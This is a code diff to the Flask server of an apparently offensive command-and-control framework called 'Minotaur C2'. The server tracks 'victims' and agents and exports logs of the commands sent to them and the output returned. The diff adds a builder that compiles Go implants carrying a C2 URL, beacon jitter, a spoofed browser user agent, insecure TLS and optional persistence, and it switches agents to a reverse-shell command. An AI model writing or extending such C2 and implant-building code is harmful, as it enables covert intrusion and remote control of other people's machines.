@@ -3,9 +3,10 @@ import os
 import subprocess
 import tempfile
 import shutil
+import glob
+from datetime import datetime
 from flask import Flask, render_template, request, jsonify, send_file
 from flask_socketio import SocketIO, emit
-from datetime import datetime
 
 from models.victim import VictimManager
 from models.port_event import PortEventManager
@@ -29,6 +30,20 @@ agent_mgr = AgentManager(socketio)
 activity_logger = ActivityLogger()
 
 logger = setup_logger()
+
+# Agent storage directory (inside static)
+AGENT_STORAGE = os.path.join(app.static_folder, 'agents')
+os.makedirs(AGENT_STORAGE, exist_ok=True)
+
+def clean_old_agents(goos, goarch):
+    """Keep only the latest agent for a given OS/arch. Delete all others."""
+    pattern = f"minotaur_agent_{goos}_{goarch}*"
+    files = glob.glob(os.path.join(AGENT_STORAGE, pattern))
+    if not files:
+        return
+    files.sort(key=os.path.getmtime)
+    for f in files[:-1]:
+        os.remove(f)
 
 # ------------------- TCP Shells -------------------
 @app.route('/')
@@ -171,7 +186,7 @@ def agent_shell():
     port = data.get('port')
     if not agent_id or not ip or not port:
         return jsonify({'error': 'Missing fields'}), 400
-    agent_mgr.add_command(agent_id, 'shell', {'ip': ip, 'port': port})
+    agent_mgr.add_command(agent_id, 'shell-reverse', {'ip': ip, 'port': port})
     return jsonify({'status': 'sent'})
 
 @app.route('/api/agent/delete', methods=['POST'])
@@ -235,70 +250,142 @@ def get_agent_activity():
     logs = activity_logger.get_agent_logs(agent_id, limit)
     return jsonify(logs)
 
+@app.route('/api/logs/victims')
+def get_log_victims():
+    victims = activity_logger.get_distinct_victim_ids()
+    return jsonify(victims)
+
+@app.route('/api/logs/agents')
+def get_log_agents():
+    agents = activity_logger.get_distinct_agent_ids()
+    return jsonify(agents)
+
+@app.route('/api/export/logs', methods=['GET'])
+def export_logs():
+    from io import BytesIO
+    log_type = request.args.get('type')
+    filter_id = request.args.get('id')
+    if log_type not in ['shell', 'agent']:
+        return jsonify({'error': 'Invalid log type'}), 400
+
+    if log_type == 'shell':
+        logs = activity_logger.get_shell_logs(filter_id, limit=10000)
+        lines = [f"Minotaur C2 - Shell Activity Logs (filter: {filter_id or 'all'})", "=" * 60]
+        for log in logs:
+            t = log['timestamp']
+            victim = log['victim_id'][:8] if log['victim_id'] else '?'
+            if log['direction'] == 'sent':
+                lines.append(f"[{t}] → [Victim {victim}] COMMAND: {log['command']}")
+            else:
+                lines.append(f"[{t}] ← [Victim {victim}] OUTPUT: {log['output']}")
+        content = "\n".join(lines)
+        filename = f"minotaur_shell_logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+    else:
+        logs = activity_logger.get_agent_logs(filter_id, limit=10000)
+        lines = [f"Minotaur C2 - Agent Activity Logs (filter: {filter_id or 'all'})", "=" * 60]
+        for log in logs:
+            sent = log['sent_at']
+            agent = log['agent_id'][:8]
+            completed = log['completed_at'] or 'pending'
+            lines.append(f"[{sent}] Agent {agent} | Type: {log['type']}")
+            lines.append(f"  Payload: {log['payload']}")
+            lines.append(f"  Result: {log['output'] or log['error'] or '(no result)'}")
+            lines.append(f"  Completed: {completed}")
+            lines.append("-" * 40)
+        content = "\n".join(lines)
+        filename = f"minotaur_agent_logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+
+    data = BytesIO(content.encode('utf-8'))
+    return send_file(data, as_attachment=True, download_name=filename, mimetype='text/plain')
+
 # ------------------- Build Agent -------------------
 @app.route('/api/build_agent', methods=['POST'])
 def build_agent():
-    data = request.json
-    c2_url = data.get('c2_url', 'http://127.0.0.1:5000')
-    beacon_delay = data.get('beacon_delay', 60)
-    jitter = data.get('jitter', 5)
-    user_agent = data.get('user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
-    insecure_tls = data.get('insecure_tls', True)
-    auto_persistence = data.get('auto_persistence', False)
-    goos = data.get('goos', 'windows')
-    goarch = data.get('goarch', 'amd64')
+    try:
+        data = request.json
+        c2_url = data.get('c2_url', 'http://127.0.0.1:5000')
+        beacon_delay = data.get('beacon_delay', 60)
+        jitter = data.get('jitter', 5)
+        user_agent = data.get('user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+        insecure_tls = data.get('insecure_tls', True)
+        auto_persistence = data.get('auto_persistence', False)
+        goos = data.get('goos', 'windows')
+        goarch = data.get('goarch', 'amd64')
 
-    if not c2_url.startswith(('http://', 'https://')):
-        return jsonify({'error': 'C2 URL must start with http:// or https://'}), 400
-    if beacon_delay < 5:
-        beacon_delay = 5
-    if jitter < 0:
-        jitter = 0
+        if not c2_url.startswith(('http://', 'https://')):
+            return jsonify({'error': 'C2 URL must start with http:// or https://'}), 400
+        if beacon_delay < 5:
+            beacon_delay = 5
+        if jitter < 0:
+            jitter = 0
 
-    # Read the agent template from the external file
-    template_path = os.path.join(os.path.dirname(__file__), 'agent_template.go')
-    if not os.path.exists(template_path):
-        return jsonify({'error': 'Agent template not found'}), 500
+        template_path = os.path.join(os.path.dirname(__file__), 'agent_template.go')
+        if not os.path.exists(template_path):
+            return jsonify({'error': 'Agent template not found'}), 500
 
-    with open(template_path, 'r') as f:
-        agent_code = f.read()
+        with open(template_path, 'r') as f:
+            agent_code = f.read()
 
-    # Replace placeholders
-    agent_code = agent_code.replace('{{ .C2URL }}', c2_url)
-    agent_code = agent_code.replace('{{ .BeaconDelay }}', str(beacon_delay))
-    agent_code = agent_code.replace('{{ .Jitter }}', str(jitter))
-    agent_code = agent_code.replace('{{ .UserAgent }}', user_agent)
-    agent_code = agent_code.replace('{{ .InsecureTLS }}', str(insecure_tls).lower())
-    agent_code = agent_code.replace('{{ .AutoPersistence }}', str(auto_persistence).lower())
+        agent_code = agent_code.replace('{{ .C2URL }}', c2_url)
+        agent_code = agent_code.replace('{{ .BeaconDelay }}', str(beacon_delay))
+        agent_code = agent_code.replace('{{ .Jitter }}', str(jitter))
+        agent_code = agent_code.replace('{{ .UserAgent }}', user_agent)
+        agent_code = agent_code.replace('{{ .InsecureTLS }}', str(insecure_tls).lower())
+        agent_code = agent_code.replace('{{ .AutoPersistence }}', str(auto_persistence).lower())
 
-    # Create temporary directory
-    temp_dir = tempfile.mkdtemp()
-    go_file = os.path.join(temp_dir, 'main.go')
-    with open(go_file, 'w') as f:
-        f.write(agent_code)
+        temp_dir = tempfile.mkdtemp()
+        go_file = os.path.join(temp_dir, 'main.go')
+        with open(go_file, 'w') as f:
+            f.write(agent_code)
 
-    # Initialise Go module
-    subprocess.run(['go', 'mod', 'init', 'minotaur-agent'], cwd=temp_dir, capture_output=True, text=True)
-    subprocess.run(['go', 'mod', 'tidy'], cwd=temp_dir, capture_output=True, text=True)
+        subprocess.run(['go', 'mod', 'init', 'minotaur-agent'], cwd=temp_dir, capture_output=True, text=True)
+        subprocess.run(['go', 'mod', 'tidy'], cwd=temp_dir, capture_output=True, text=True)
 
-    output_name = f'minotaur_agent_{goos}_{goarch}'
-    if goos == 'windows':
-        output_name += '.exe'
+        output_name = f'minotaur_agent_{goos}_{goarch}'
+        if goos == 'windows':
+            output_name += '.exe'
 
-    build_cmd = ['go', 'build', '-ldflags=-s -w', '-o', output_name]
-    env = os.environ.copy()
-    env['GOOS'] = goos
-    env['GOARCH'] = goarch
-    env['CGO_ENABLED'] = '0'
+        build_cmd = ['go', 'build', '-ldflags=-s -w', '-o', output_name]
+        env = os.environ.copy()
+        env['GOOS'] = goos
+        env['GOARCH'] = goarch
+        env['CGO_ENABLED'] = '0'
 
-    result = subprocess.run(build_cmd, cwd=temp_dir, env=env, capture_output=True, text=True)
+        result = subprocess.run(build_cmd, cwd=temp_dir, env=env, capture_output=True, text=True)
 
-    if result.returncode != 0:
+        if result.returncode != 0:
+            shutil.rmtree(temp_dir)
+            return jsonify({'error': f'Build failed: {result.stderr}'}), 500
+
+        binary_path = os.path.join(temp_dir, output_name)
+        storage_path = os.path.join(AGENT_STORAGE, output_name)
+        shutil.copy(binary_path, storage_path)
+        clean_old_agents(goos, goarch)
         shutil.rmtree(temp_dir)
-        return jsonify({'error': f'Build failed: {result.stderr}'}), 500
 
-    binary_path = os.path.join(temp_dir, output_name)
-    return send_file(binary_path, as_attachment=True, download_name=output_name)
+        return jsonify({'status': 'success', 'filename': output_name, 'url': f'/static/agents/{output_name}'})
+
+    except Exception as e:
+        import traceback
+        traceback.print_exc()
+        return jsonify({'error': f'Internal error: {str(e)}'}), 500
+
+@app.route('/api/agents/list')
+def list_agent_files():
+    """Return list of available compiled agents with download URLs and commands."""
+    files = []
+    for f in os.listdir(AGENT_STORAGE):
+        if f.startswith('minotaur_agent_'):
+            full_path = os.path.join(AGENT_STORAGE, f)
+            mod_time = os.path.getmtime(full_path)
+            files.append({
+                'filename': f,
+                'url': f'/static/agents/{f}',
+                'modified': datetime.fromtimestamp(mod_time).isoformat(),
+                'size': os.path.getsize(full_path)
+            })
+    files.sort(key=lambda x: x['modified'], reverse=True)
+    return jsonify(files)
 
 # ------------------- SocketIO Events -------------------
 @socketio.on('connect')
